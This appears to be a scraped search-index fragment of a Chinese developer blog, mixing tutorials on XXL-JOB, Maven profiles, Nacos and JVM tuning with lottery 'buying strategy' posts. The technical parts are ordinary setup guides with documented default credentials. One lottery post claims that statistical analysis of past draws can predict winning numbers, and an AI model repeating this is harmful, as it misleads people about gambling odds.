ports: - 8080:8080 请自行更改 MySQL 数据库的连接信息，例如 IP、用户名和密码。 登录控制台浏览器访问 http://127.0.0.1:8080/xxl-job-admin，默认登录的账号密码是 admin / 123456。 访问令牌配置为了提升系统的安全性，可要求任务调度中心和执行器进行安全性校验，双方的 AccessToken 匹配才允许通讯。任务调度中心和执行器，均可通过配置项 xxl.job.accessToken 进行 AccessToken 的设置。 启动 Docker 容器时，可以通过 -e PARAMS 指定 AccessToken 12345docker run -e PARAMS="--server.port=8080 --spring.datasource.url=jdbc:mysql://127.0.0.1:3306/xxl_job?characterEncoding=UTF-8&amp;autoReconnect=true&amp;allowMultiQueries=true&amp;useSSL=false&amp;serverTimezone=Asia/Shanghai --spring.datasource.username=root --spring.datasource.password=root --xxl.job.accessToken=default_token" \\-p 8080:8080 \\-v /tmp/logs:/data/applogs \\--name xxl-job-admin \\-d xuxueli/xxl-job-admin:2.3.1 在 SpringBoot 项目中，可以使用以下内容配置执行器的 AccessToken 12345xxl: job: accessToken: default_token admin: addresses: http://127.0.0.1:8080/xxl-job-admin 提示，如果任务调度中心和执行器要实现正常通讯，只有两种设置 第一种：任务调度中心和执行器，设置了相同的 AccessToken。 第二种：任务调度中心和执行器，均不设置 AccessToken，即关闭安全性校验。 特别注意：XXL-JOB 从 v.2.3.1 版本开始，调度通讯默认启用 AccessToken，且默认的 AccessToken 是 default_token。 更改登录密码XXL-JOB 的用户密码采用 MD5 算法 32 位小写加密。由于 MD5 是摘要算法，不可逆向的，每次登录时需要将密码通过相同的 MD5 算法加密后对比数据库是否一致，所以想修改密码只能修改数据库表的字段值。使用下述 Java 代码将新密码通过 MD5 算法加密，然后更改到数据库的 xxl_job_user 表即可。 特别注意 如果修改的新密码在加密前长度超过 18 位，仍然会登录失败，原因是 XXL-JOB 的前端页面对输入框输入的密码做了截取，只保留了 18 位字符并传到后端，因此会导致输入正确的密码后仍然登录失败，因此新密码的最大长度只支持 18 位。 12345678910import org.springframework.util.DigestUtils;public class PasswordEncoderUtil { public static void main(String[] args) { String password = DigestUtils.md5DigestAsHex("newPassword".getBytes()); System.out.println(password); }} 参考博客 XXL-JOB 的 Docker 部署与接入教程 XXL-JOB 访问令牌（AccessToken）设置 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化"},{title:"XXL-JOB 入门教程之一",url:"/posts/acac3139.html",text:'大纲 XXL-JOB 入门教程之一 XXL-JOB 入门教程之二 前言 XXL 官方开源社区 XXL-JOB 官方文档 XXL-JOB 官方项目 什么是任务调度任务调度就是我们常说的定时任务，定时任务是指在指定时间、指定的频率去执行任务（业务代码）。任务调度是日常开发中非常常见的一个业务场景，我们经常需要去运行一些的周期性、指定时间点等方式自动触发的异步业务逻辑。 集中式任务调度集中式任务是与分布式任务恰好相反的概念，集中式任务就是单机任务，一个项目，一台机器，也就是我们常说的单体应用。对于集中式任务，也就是我们 Java 开发中常见的定时任务。 集中式任务调度的问题如果采用集中式的任务调度方式，在分布式集群部署的模式下会带来一些问题，比如： 多台机器集群部署的定时任务如何保证不被重复执行？ 如何动态地调整定时任务的执行时间（不重启服务的情况下）？ 部署定时任务的机器发生故障时，如何实现故障转移？ 如何对定时任务的执行情况进行监控？ 业务量较大，单机遭遇性能瓶颈问题，任务调度如何扩展？ 集中式任务调度的缺点 不支持分片任务：处理有序数据时，多机器分片执行任务处理不同数据。 不支持生命周期统一管理：不重启服务的情况下关闭、启动任务。 不支持集群：存在任务重复执行的问题。 不支持失败重试：出现异常后任务终结，不能根据执行状态控制任务重新执行。 不支持动态调整：在不重启服务的情况下，动态修改任务参数。 不支持报警机制：在任务执行失败之后，没有报警机制。 不支持任务数据统计：在任务数据量大时，对于任务执行情况无法高效地统计执行情况。 Java 实现集中式任务调度的方式 实现方式 说明 while (true) + Thread.sleep 轮询 + 线程休眠的方式实现定时任务（最古老的方法） java.util.Timer + java.util.TimerTask Timer 是一种定时器工具，用来在一个后台线程按计划执行指定任务，它可以按计划执行一个任务一次或反复多次。TimerTask 是一个抽象类，它的子类代表一个可以被 Timer 计划的任务。 ScheduledExecutorService 从 JDK 1.5 开始，ScheduledExecutorService 做为并发工具类被引入，是最理想的定时任务实现方式 Quartz Quartz 是一个开源的定时任务调度框架，由 Java 编写而成，用于 Java 生态下的定时任务调度，是一个灵活方便、使用简单的定时任务调度框架，可以和 Spring 整合使用 Spring Task Spring 框架从 3.0 版本开始提供的轻量级的定时任务调用工具，使用起来很方便 Spring Boot 注解 @EnableScheduling + @Scheduled 底层依然是采用 Spring Task 来实现任务调度 分布式任务调度分布式任务调度的优点 高可用。在集群架构下，有节点出现异常，不影响任务的执行。 动态配置。对任务的执行周期，以及其他跟任务相关的属性不停机修改。 生命周期管理。可以在不停机的情况下，对任务单次执行启动任务，关闭任务的管理。 失败机制。在任务执行过程中出现执行失败时，支持报警、任务重试并快速查阅执行日志。 数据统计。在定时任务数比较多的情况下，支持统计一共有多少任务，哪些任务执行失败过，哪些任务执行成功。 分片执行。对于批量处理的数据，让多台机器执行该任务，对数据进行分片处理。 分布式任务调度解决方案由于集中式的定时任务调度需要解决一系列问题，所以在技术演进的过程中产生一些解决办法： 使用数据库唯一约束 使用配置文件、Redis、MySQL 作为任务调度的开关 使用分布式锁实现任务调度的并发控制 使用开源的分布式任务调度平台 TBSchedule、Elastic-Job、Saturn、XXL-JOB 等 自研分布式任务调度平台 分布式任务调度开源框架XXL-JOBXXL-JOB 是美团开源的轻量级分布式任务调度平台，其核心设计目标是轻量级、易扩展、开发迅速、开箱即用，已有多家公司线上产品线采用了 XXL-JOB。 Elastic-JobElastic-Job 是当当网推出的分布式任务调度框架，现在已经被纳入到 Apache 基金会下，很多公司的产品都在使用该分布式任务调度框架。 PowerJobPowerJob 是新一代分布式任务调度与计算框架，支持 CRON、API、固定频率、固定延迟等调度策略，提供工作流来编排任务解决依赖关系，使用简单，功能强大。 SaturnSaturn 唯品会推出的开源分布式任务调度平台，它是基于 Elastic-Job 而开发的，新增了一些特性，唯品会内部及一些互联网公司都在使用，但目前项目处于停止维护的状态。 IDEA 运行 XXL-JOB 调度中心XXL-JOB 由调度中心（服务端）和执行器（客户端）两个核心模块组成，因此一般需要先运行调度中心的服务，然后再开发执行器（客户端）的业务代码。 下载源码项目12345# GitHub$ git clone https://github.com/xuxueli/xxl-job.git# Gitee$ git clone https://github.com/xuxueli/xxl-job.git 导入源码项目将源码项目导入到 IDEA 中，方便快速启动 XXL-JOB 的调度中心和阅读底层源码。 初始化数据库为了初始化调度中心的数据库，需要在数据库里执行源码项目中的 SQL 脚本，文件路径是 /xxl-job/doc/db/tables_xxl_job.sql。值得一提的是，数据库初始化完成之后，一共有 8 张表。 表名称 描述 xxl_job_group 执行器信息表，用于维护任务执行器的信息 xxl_job_info 调度扩展信息表，用于存储调度任务的扩展信息，比如任务分组、任务名、机器的地址等 xxl_job_lock 任务调度锁表 xxl_job_log 日志表，用于存储任务调度的历史信息，例如调度结果、执行结果、调度入参等 xxl_job_log_report 日志报表，用于存储任务调度的日志报表，会在调度中心里的报表功能里使用到 xxl_job_logglue 任务的 GLUE 日志，用于存储 GLUE 日志的更新历史变化，支持 GLUE 版本的回溯功能 xxl_job_registry 执行器的注册表，用在维护在线的执行器与调度中心的地址信息 xxl_job_user 系统的用户表，可以用表中默认的用户名与密码进行登录 更改配置信息打开 xxl-job-admin 模块下的 application.properties 配置文件，更改数据库的连接信息。 12345### xxl-job, datasourcespring.datasource.url=jdbc:mysql://127.0.0.1:3306/xxl_job?useUnicode=true&amp;characterEncoding=UTF-8&amp;autoReconnect=true&amp;useSSL=false&amp;serverTimezone=Asia/Shanghaispring.datasource.username=rootspring.datasource.password=rootspring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver 启动调度中心打开 xxl-job-admin 模块下的 XxlJobAdminApplication 主启动类，在 IDEA 内直接启动调度中心的服务。 登录调度中心浏览器访问 http://127.0.0.1:8080/xxl-job-admin，默认登录的账号密码是 admin / 123456。 提示 若浏览器能正常访问调度中心的管理页面，则说明 XXL-JOB 的调度中心启动成功。 XXL-JOB 调度中心的前端页面使用了 AdminLTE 框架，它是一个基于 Bootstrap 框架和 jQuery 插件的开源的管理模板工具，提供了一系列响应迅速的、可重复使用的组件，并设置了许多模板页面。 Docker 运行 XXL-JOB 调度中心 Docker 安装 XXL-JOB var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"分布式"},{title:"Maven 激活 SpringBoot 配置文件",url:"/posts/82a430bf.html",text:'前言为了实现不同环境构建的不同需求，这里使用到了 Maven 的 Profile 特性。因为 Profile 能够在构建时修改 POM 的一个子集，或者添加额外的配置元素。接下来将介绍 Maven 中对 Profile 的配置和激活。 Maven 配置1234567891011121314151617181920212223242526272829303132333435363738394041&lt;build&gt; &lt;finalName&gt;${project.name}&lt;/finalName&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src/main/resources&lt;/directory&gt; &lt;filtering&gt;true&lt;/filtering&gt; &lt;/resource&gt; &lt;/resources&gt;&lt;/build&gt;&lt;project&gt; &lt;!--多环境配置--&gt; &lt;profiles&gt; &lt;profile&gt; &lt;id&gt;dev&lt;/id&gt; &lt;properties&gt; &lt;!-- 环境标识，需要与配置文件的名称相对应 --&gt; &lt;profiles.active&gt;dev&lt;/profiles.active&gt; &lt;nacos.username&gt;nacos&lt;/nacos.username&gt; &lt;nacos.password&gt;nacos&lt;/nacos.password&gt; &lt;/properties&gt; &lt;activation&gt; &lt;!-- 是否为默认环境 --&gt; &lt;activeByDefault&gt;true&lt;/activeByDefault&gt; &lt;/activation&gt; &lt;/profile&gt; &lt;profile&gt; &lt;id&gt;prod&lt;/id&gt; &lt;properties&gt; &lt;!-- 环境标识，需要与配置文件的名称相对应 --&gt; &lt;profiles.active&gt;prod&lt;/profiles.active&gt; &lt;nacos.username&gt;admin&lt;/nacos.username&gt; &lt;nacos.password&gt;admin&lt;/nacos.password&gt; &lt;/properties&gt; &lt;activation&gt; &lt;!-- 是否为默认环境 --&gt; &lt;activeByDefault&gt;false&lt;/activeByDefault&gt; &lt;/activation&gt; &lt;/profile&gt; &lt;/profiles&gt;&lt;/project&gt; SpringBoot 配置在 SpringBoot 项目的 application.yml 配置文件中，可以通过 @属性名@ 的格式获取在 &lt;profile&gt; 标签中定义的属性值，同时还可以通过 @profiles.active@ 的格式来获取当前被激活的 Profile 的 Id 属性。 配置案例一123spring: profiles: active: @profiles.active@ 配置案例二在下述的例子中，使用 Nacos 作为配置中心，当 Maven 激活不同的 Profile 时，Nacos 的客户端会从配置中心拉取 Profile 对应的配置信息。 1234567891011121314151617181920server: port: 9091spring: application: name: @artifactId@ cloud: nacos: username: @nacos.username@ password: @nacos.password@ discovery: server-addr: ${NACOS_HOST:shop-register}:${NACOS_PORT:8848} config: server-addr: ${spring.cloud.nacos.discovery.server-addr} extension-configs[0]: data-id: shop-application-@profiles.active@.yml refresh: true extension-configs[1]: data-id: @artifactId@-@profiles.active@.yml refresh: true 无法解析 @ 符号若使用了上述的 SpringBoot 配置内容后，在 IDEA 内启动项目时，提示 @...@ 的内容无法解析，可以按照以下步骤解决。 第一步：在 POM 里添加 Maven 插件 12345678910111213141516171819202122232425262728&lt;build&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src/main/java&lt;/directory&gt; &lt;filtering&gt;false&lt;/filtering&gt; &lt;includes&gt; &lt;include&gt;**/*.*&lt;/include&gt; &lt;/includes&gt; &lt;/resource&gt; &lt;resource&gt; &lt;directory&gt;src/main/resources&lt;/directory&gt; &lt;filtering&gt;true&lt;/filtering&gt; &lt;includes&gt; &lt;include&gt;**/*.*&lt;/include&gt; &lt;/includes&gt; &lt;/resource&gt; &lt;/resources&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-resources-plugin&lt;/artifactId&gt; &lt;version&gt;3.3.0&lt;/version&gt; &lt;configuration&gt; &lt;delimiters&gt;@&lt;/delimiters&gt; &lt;useDefaultDelimiters&gt;false&lt;/useDefaultDelimiters&gt; &lt;/configuration&gt; &lt;/plugin&gt;&lt;/build&gt; 第二步：先执行 Maven 的编译命令，再让 IDEA 启动项目 1$ mvn clean install Maven 激活配置 当打包项目时，可以在 Maven 的命令行中添加参数 -P，指定要激活的 Profile 的 Id，这样就可以激活不同的环境配置。 1$ mvn clean package -Pdev 如果一次要激活多个 Profile，可以用逗号分开一起激活 1$ mvn clean package -Pdev,test 若希望查看当前默认激活的是哪个 Profile，可以使用以下命令 1$ mvn help:active-profiles Maven 读取系统环境变量在 Linux 系统环境中，Maven 可以使用 ${env.xxxx} 的格式读取到系统的环境变量，使用示例如下： 12345678910111213141516171819202122232425262728293031&lt;project&gt; &lt;!--多环境配置--&gt; &lt;profiles&gt; &lt;profile&gt; &lt;id&gt;dev&lt;/id&gt; &lt;properties&gt; &lt;!-- 环境标识，需要与配置文件的名称相对应 --&gt; &lt;profiles.active&gt;dev&lt;/profiles.active&gt; &lt;nacos.username&gt;nacos&lt;/nacos.username&gt; &lt;nacos.password&gt;nacos&lt;/nacos.password&gt; &lt;/properties&gt; &lt;activation&gt; &lt;!-- 是否为默认环境 --&gt; &lt;activeByDefault&gt;true&lt;/activeByDefault&gt; &lt;/activation&gt; &lt;/profile&gt; &lt;profile&gt; &lt;id&gt;prod&lt;/id&gt; &lt;properties&gt; &lt;!-- 环境标识，需要与配置文件的名称相对应 --&gt; &lt;profiles.active&gt;prod&lt;/profiles.active&gt; &lt;nacos.username&gt;${env.NACOS_USERNAME}&lt;/nacos.username&gt; &lt;nacos.password&gt;${env.NACOS_PASSWORD}&lt;/nacos.password&gt; &lt;/properties&gt; &lt;activation&gt; &lt;!-- 是否为默认环境 --&gt; &lt;activeByDefault&gt;false&lt;/activeByDefault&gt; &lt;/activation&gt; &lt;/profile&gt; &lt;/profiles&gt;&lt;/project&gt; 参考资料 Maven 构建配置和激活 SpringBoot 配置文件 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java"},{title:"Nacos 开发随笔",url:"/posts/85aa5d65.html",text:'配置内存大小配置参数 JVM 参数 说明 JVM_XMS=512m -Xms - JVM 启动时分配的内存大小 JVM_XMX=512m -Xmx - JVM 运行过程中分配的最大内存大小 JVM_XMN=256m -Xmn - JVM 堆内存中新生代的大小 配置方式 第一种方式，启动 Docker 容器时指定 JVM 参数 1docker run --name nacos-standalone -e MODE=standalone -e JVM_XMS=512m -e JVM_XMX=512m -e JVM_XMN=256m -p 8848:8848 -d nacos/nacos-server:latest 第二种方式，在 Nacos 的 Env 配置文件中添加 JVM 参数 123456PREFER_HOST_MODE=hostnameMODE=standaloneSPRING_DATASOURCE_PLATFORM=mysqlJVM_XMS=512mJVM_XMX=512mJVM_XMN=256m 更改登录密码 引入依赖 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;&lt;/dependency&gt; 通过 BCryptPasswordEncoder 类生成新的密码，注意盐值是随机的，所以生成的密码每次都可能不一样，请不要担心 12345678910import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;public class PasswordEncoderUtil { public static void main(String[] args) { // 每次生成的密码都可能不一样 System.out.println(new BCryptPasswordEncoder().encode("newPassword")); }} 更改 Nacos 的 users 表，指定新的密码 若是添加新的 Nacos 用户，可以参考以下 SQL 语句 12INSERT INTO users (username, password, enabled) VALUES (\'admin\', \'$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu\', TRUE);INSERT INTO roles (username, role) VALUES (\'admin\', \'ROLE_ADMIN\'); var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务 开发随笔"},{title:"快乐 8 购买攻略",url:"/posts/b99b3e39.html",text:'var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"彩票竞猜"},{title:"双色球购买攻略",url:"/posts/6be8d9e3.html",text:'开奖日期 开奖时间： 21:15 开奖日期： 每周二、四、日 截止停售时间： 开奖日期的 20:00 购买规则双色球 每注投注号码由 6 个红色球号码和 1 个蓝色球号码组成。红色球号码从 1 ~ 33 中选择，蓝色球号码从 1 ~ 16 中选择。每注基本投注金额人民币为 2 元。 购彩攻略 1、增加购买彩票的数量：这会提高中奖的机会，但同时也会增加投入的成本。 2、避免常见的号码组合：比如选择连号、同尾数、同奇偶等常见组合，因为这些号码容易被别人选择，中奖的概率也会降低。 3、购买多种号码组合：通过购买多种号码组合，可以增加中奖的机会。但是，这也会增加成本。 4、参与合买：加入合买团队可以增加中奖的概率，但是奖金也需要与其他参与者分享。 5、选择冷门号码：通常人们会倾向于选择热门号码，也就是经常出现的号码，但这样的号码也会有很多人选择，导致最终的奖金分配比较平均。选择一些较为冷门的号码，虽然中奖的概率较低，但是如果中奖的话，奖金可能会更高。 请注意，彩票是一种纯粹的随机游戏，没有任何策略可以保证中奖。所以，玩彩票应该理性看待，量力而行。 中奖规则 中奖概率 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"彩票竞猜"},{title:"超级大乐透购买攻略",url:"/posts/2ad61463.html",text:'开奖日期 开奖时间： 21:25 开奖日期： 每周一、三、六 截止停售时间： 开奖日期的 21:00 购买规则超级大乐透 基本投注是指从前区号码中任选 5 个号码，并从后区号码中任选 2 个号码的组合进行投注。其中，前区号码由 1 ~ 35 号码组成，后区号码由 1 ~ 12 号码组成。每注基本投注金额人民币为 2 元。 购买攻略 1、购买更多的彩票：这会增加中奖的机会，但是也意味着需要投入更多的资金。 2、选择冷门号码：冷门号码是指在过去的开奖中出现频率较低的号码，虽然中奖概率较低，但如果中奖可以获得较高的奖金。 3、使用统计学方法：通过分析历史开奖数据，利用统计学方法预测下一期的中奖号码，例如数学公式、遗漏数据、走势图等。 4、参加合买：合买是指多人共同购买彩票，增加了中奖的机会，但中奖奖金需要分配给所有参与者。 5、选择热门号码：热门号码是指在过去的开奖中出现频率较高的号码，可以通过分析历史开奖数据来选择热门号码，但这样的号码也会有很多人选择，导致最终的奖金分配比较平均。 请注意，彩票是一种纯粹的随机游戏，没有任何策略可以保证中奖。所以，玩彩票应该理性看待，量力而行。 中奖规则 中奖概率 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"彩票竞猜"},{title:"ChatGPT 资源汇总",url:"/posts/78bfedfa.html",text:'网站资源 名称 网址 描述 GPT-3 Demo https://gpt3demo.com/ ChatGPT, AI and GPT-3 Apps and use cases var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ai"},{title:"JMeter 压测教程之二 JVM 调优",url:"/posts/e0671e6d.html",text:'大纲 JMeter 压测教程之一基础使用 JMeter 压测教程之二 JVM 调优 JVM 简单介绍JVM 内存结构JVM 内存结构主要有三大块：栈、堆内存、方法区。堆内存是 JVM 中最大的一块。方法区存储类信息、静态变量、常量、常量池等数据，是线程共享的区域，为了与 Java 堆区分，方法区还有一个别名 Non-Heap （非堆）。栈又分为 Java 虚拟机栈和本地方法栈，主要用于方法的执行。 JVM 堆内存所有的对象实例以及数组都要在堆内存上分配，堆内存是垃圾收集器管理的主要区域，也被称为 GC 堆。堆内存由新生代和老年代组成，不包括永久代（方法区）；而新生代内存又被分成 Eden 空间、From Survivor 空间、To Survivor 空间，默认情况下新生代按照 8:1:1 的比例来分配。 提示 从 Java 8 开始，HotSpot 已经完全将永久代（Permanent Generation）移除，取而代之的是一个新的区域 — 元空间（MetaSpace）。 JVM 性能监控为了方便监控 JVM 的性能，JDK 提供了 jconsole、jvisualvm 工具，两者都可以通过命令行直接启动，支持监控本地和远程应用。值得一提的是，推荐使用 jvisualvm，因为它可以看作是升级版的 jconsole。 Jconsole 监控启动监控 启动命令 1$ jconsole 运行界面 Jvisualvm 监控jvisualvm 可以监控内存泄露、跟踪垃圾回收、执行时内存分析、CPU 分析、线程分析等。 启动监控 启动命令 1$ jvisualvm 运行界面 安装插件为了方便查看 GC 的情况，jvisualvm 需要提前安装指定的插件。 第一步：查看 JDK 版本 1$ java -version 第二步：浏览器打开 官方插件中心 的页面，根据 JDK 版本找到 Java VisualVM 的更新链接，例如 https://visualvm.github.io/archive/uc/8u40/updates.xml.gz 第三步：菜单栏导航到 工具 -&gt; 插件 -&gt; 设置，点击 编辑 按钮，将 URL 更改为上面找到的 Java VisualVM 更新链接 第四步：菜单栏导航到 工具 -&gt; 插件 -&gt; 可用插件，点击 检查最新版本 按钮，等插件列表更新成功后，勾选 Visual GC 项，最后点击 安装 按钮即可。 第六步：重启 jvisualvm 后，选择要监控的应用，若在标签页中看到 Visual GC 页面，则说明 GC 插件安装成功。 性能监控指标中间件指标常用的中间件（如 Tomcat、Weblogic）监控指标，主要包括 JVM、ThreadPool、JDBC 等，具体如下： 当前正在运行的线程数不能超过设定的最大值。一般情况下系统性能较好的情况下，线程数最小值设置为 50 和最大值设置为 200 比较合适。 当前运行的 JDBC 连接数不能超过设定的最大值。一般情况下系统性能较好的情况下，JDBC 最小值设置为 50 和最大值设置为 200 比较合适。 GC 频率不能频繁，特别是 FULL GC 更不能频繁，一般情况下系统性能较好的情况下，JVM 最小堆大小和最大堆大小分别设置 1024M 比较合适。 数据库指标常用的数据库（如 MySQL）监控指标，主要包括 SQL 性能、吞吐量、缓存命中率、锁、连接数等，具体如下： SQL 执行耗时越小越好，一般情况下微秒级别。 缓存命中率越高越好，一般情况下不能低于 95%。 锁等待次数越低越好，等待时间越短越好。 中间件压测案例以简单的电商商城项目为例，各中间件的压测结果如下： 总结 中间件越多，性能损失越大，大多都损失在网络交互上。 业务优化方向：数据库、模板页面的渲染速度、静态资源。 JVM 分析 &amp; 调优JVM 调优，调的是稳定，并不能让性能得到大幅提升。服务稳定的重要性就不用多说了，保证服务的稳定，GC 永远会是 JAVA 程序员需要考虑的不稳定因素之一。复杂和高并发下的服务，必须保证每次 GC 不会出现性能下降，各种性能指标不会出现波动，GC 回收规律而且干净，找到合适的 JVM 设置。FULL GC 最会影响性能，根据代码问题，避免 FULL GC 频率。可以适当调大年轻代的容量，让大对象可以在年轻代触发 YONG GC，调整大对象在年轻代的回收频次，尽可能保证大对象在年轻代回收，减小老年代缩短回收时间。 提示 Oracle 官方的 JVM 调优文档 常用工具 工具 说明 jstack 查看 JVM 线程运行状态，是否有死锁现象等信息 jinfo 可以输出并修改运行时的 Java 进程的 opts jps 与 Unix 上的 ps 命令类似，用来显示本地的 Java 进程，可以查看本地运行着几个 Java 程序，并显示它们的进程号 jstat 一个极强的监视 VM 内存工具。可以用来监视 VM 内存内的各种堆和非堆的大小及其内存使用量 jmap 打印出某个 Java 进程（使用 pid）内存内的所有 对象 的情况（如：产生哪些对象及其数量） 工具使用在使用下述工具前，建议先用 jps 命令获取当前的每个 JVM 进程号，然后选择要查看的 JVM。 jstat 使用jstat 工具特别强大，参数有众多的可选项，可详细地查看堆内各个部分的使用量，以及类加载的数量。使用时，需加上应用的进程 id 和所选参数。 命令 说明 jstat -class pid 显示加载 Class 的数量，及所占空间等信息 jstat -compiler pid 显示 VM 实时编译的数量等信息 jstat -gc pid 显示 GC 的信息，查看 GC 的次数与时间 jstat -gccapacity pid 堆内存统计，包括堆内存的使用和占用大小 jstat -gcnew pid 新生代垃圾回收统计 jstat -gcnewcapacity pid 新生代内存统计 jstat -gcold pid 老年代垃圾回收统计 jstat -gcutil pid 堆内存（包括新生代、老年代）的垃圾回收统计 除了以上 pid 参数外，还可以同时加上两个数字，示例如下： jstat -gcutil pid 1000 100: 每 1000 毫秒统计一次 GC 情况，一共统计 100 次 jstat -printcompilation pid 250 6： 表示每 250 毫秒打印一次，一共打印 6 次，还可以加上 -h3 参数使每三行显示一次标题 jinfo 使用jinfo 是 JDK 自带的命令，可以用来查看正在运行的 Java 应用程序的扩展参数，包括 Java System 属性和 JVM 命令行参数；也可以动态地修改正在运行的 JVM 一些参数。当系统崩溃时，jinfo 可以从 core 文件里面知道崩溃的 Java 应用程序的配置信息。 命令 说明 jinfo pid 输出当前 JVM 进程的全部参数和系统属性 jinfo -flag name pid 查看指定的 JVM 参数的值，打印结果： - 无此参数，`+ 有此参数 jinfo -flag [+/-]name pid 开启或者关闭对应名称的参数（无需重启虚拟机） jinfo -flag name=value pid 修改指定参数的值 jinfo -flags pid 输出全部的参数 jinfo -sysprops pid 输出当前 JVM 进行的全部的系统属性 jmap 使用jmap 命令可以生成堆内存的 Dump 文件，也可以查看堆内对象分析内存信息等，如果不使用这个命令，还可以使用 -XX:+HeapDumpOnOutOfMemoryError 参数来让虚拟机在出现 OOM 的时候自动生成 Dump 文件。 命令 说明 jmap -dump:live,format=b,file=product.dump pid Dump 堆内存到指定的文件，format 指定输出格式，live 指明是活着的对象，file 指定文件名。Eclipse 可以直接打开这个文件 jmap -heap pid 打印堆内存的概要信息，包括 GC 使用的算法、堆内存的配置和使用情况，可以用此来判断目前内存的使用情况以及垃圾回收情况 jmap 